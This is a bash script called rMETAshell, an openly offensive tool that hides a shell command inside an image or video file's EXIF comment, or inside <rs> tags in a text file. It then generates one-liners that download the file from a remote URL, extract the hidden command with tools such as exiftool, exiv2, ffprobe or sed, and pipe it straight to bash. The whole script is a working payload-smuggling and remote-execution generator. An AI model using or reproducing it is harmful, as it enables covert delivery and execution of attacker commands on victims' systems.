#!/bin/bash
#
# Ver. Thu/Jan/11/2024
#-------------------------------------------------
#
# From: git5 with ❤️
#
# rMETAshell - A shell command metadata injection
# and one-liner generator tool!
#-------------------------------------------------
#
# git5
# ------------------------------------------------
#
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
#
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
#
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/HnHLEHh4bSR0Y5NrdcP3Al
# ------------------------------------------------
#
# X
# https://x.com/git5loxosec
# ------------------------------------------------
#
# Facebook
# https://www.facebook.com/profile.php?id=61551530174528
# ------------------------------------------------

show_help() {
    echo -e "\\e[36mUsage: $0 [OPTIONS] <filename> <URL>\\e[0m"
    echo -e "\\e[36mInject a shell command into a file, generate a one-liner execution method, and upload the file.\\e[0m"
    echo ""
    echo -e "\\e[36mOptions:\\e[0m"
    echo "  -h, --help           Display this help message."
    echo "  -c, --choose         Choose a script from a list."
    echo ""
    echo -e "\\e[36mArguments:\\e[0m"
    echo -e "\\e[36m  <filename>            The name of the file.\\e[0m"
    echo -e "\\e[36m  <URL>                 The URL path to upload the file (e.g., http://www.example.com).\\e[0m"
    echo ""
}

contains_element() {
    local element=$1
    shift
    for item; do
        [[ $item == $element ]] && return 0
    done
    return 1
}

command_list_file="db/command_list.txt"
media_compat_file="db/media_compatibility.txt"
text_compat_file="db/text_compatibility.txt"

IFS=' ' read -ra media_compatibility <<< "$(cat "$media_compat_file")"
IFS=' ' read -ra text_compatibility <<< "$(cat "$text_compat_file")"

choose_command() {
    echo -e "\\e[36mAvailable Scripts:\\e[0m"
    local i=1
    local cmd_array=()
    while IFS= read -r line; do
        cmd_array+=("$line")
        IFS=':' read -r name description command <<< "$line"
        echo "$i. $name - $description"
        ((i++))
    done < "$command_list_file"

    read -p "Select a command number: " choice
    if [[ $choice -lt 1 || $choice -gt ${#cmd_array[@]} ]]; then
        echo "Invalid selection. Please try again."
        return 1
    fi
    IFS=':' read -r name description command <<< "${cmd_array[$choice-1]}"
}

choose=0
while getopts ":hc" opt; do
  case $opt in
    h)
      show_help
      exit 0
      ;;
    c)
      choose=1
      ;;
    \?)
      echo -e "\\e[91mError: Invalid option -$OPTARG\\e[0m" >&2
      show_help
      exit 1
      ;;
  esac
done

shift $((OPTIND-1))

if [ "$#" -ne 2 ]; then
    echo -e "\\e[91mError: Invalid number of arguments.\\e[0m"
    show_help
    exit 1
fi

filename="$1"
url="$2"

if [ "$choose" -eq 1 ]; then
    choose_command
else
    read -p "Enter a shell command: " command
fi

file_extension="${filename##*.}"

if contains_element "$file_extension" "${media_compatibility[@]}"; then
    echo -e "\\e[95mInjecting shell command into media file...\\e[0m"
    exiftool -Comment="$command" "$filename"
    echo -e "\\e[95mMedia file command injection method completed.\\e[0m"
elif contains_element "$file_extension" "${text_compatibility[@]}"; then
    echo -e "\\e[95mInjecting shell command into text file...\\e[0m"
    echo "<rs>$command</rs>" >> "$filename"
    echo -e "\\e[95mText-based file command injection method completed.\\e[0m"
else
    echo -e "\\e[91mError: File extension '$file_extension' not supported.\\e[0m"
    show_help
    exit 1
fi

echo -e "\\e[36mSelect a one-liner method:\\e[0m"
echo -e "\\e[36mExecution methods compatible with image file format:\\e[0m"
echo "1. image-exiftool-one-liner"
echo "2. image-exiv2-one-liner"
echo "3. image-identify-one-liner"
echo "4. image-file-grep-one-liner"

echo -e "\\e[36mExecution methods compatible with video file format:\\e[0m"
echo "5. video-exiftool-one-liner"
echo "6. video-ffprobe-one-liner"

echo -e "\\e[36mExecution methods compatible with text file format:\\e[0m"
echo "7. text-sed-one-liner"
echo -e "\\e[36mExecution method for an infected image/video saved in a zip:\\e[0m"
echo "8. image/video-exiftool-zip-one-liner"
read -p "Enter the method number (1-8): " method_choice

case "$method_choice" in
    1)
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        ;;
    2)
        one_liner="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
        ;;
    3)
        one_liner="curl -s '$url/$filename' | identify -format '%c' - | bash"
        ;;
    4)
        one_liner="curl -s '$url/$filename' | file - | grep -oP 'comment: \"\K[^\"]*' | bash"
        ;;
    5)
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        ;;
    6)
        one_liner="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        ;;
    7)
        one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
        ;;
    8)
        read -p "Enter the name of the file inside the ZIP archive: " filename2
        one_liner="curl -s '$url/$filename' -o $filename && unzip -p $filename $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
        ;;
    *)
        echo -e "\\e[91mError: Invalid method number.\\e[0m"
        exit 1
        ;;
esac

echo -e "Generated one-liner:\\n\\e[32m$one_liner\\e[0m"
echo -e "\\e[37mOne-liner method execution completed.\\e[0m"
